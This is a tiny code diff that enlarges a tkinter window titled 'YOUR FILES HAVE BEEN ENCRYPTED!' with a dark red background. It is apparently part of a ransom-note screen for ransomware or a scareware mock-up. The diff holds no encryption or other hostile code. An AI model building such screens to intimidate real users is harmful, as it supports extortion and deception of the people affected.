@@ -2,7 +2,7 @@ import tkinter as tk
 
 root = tk.Tk()
 root.title(" YOUR FILES HAVE BEEN ENCRYPTED! ")
-root.geometry("650x450")
+root.geometry("850x550")
 root.configure(bg="#3a0000")
 
 # Header
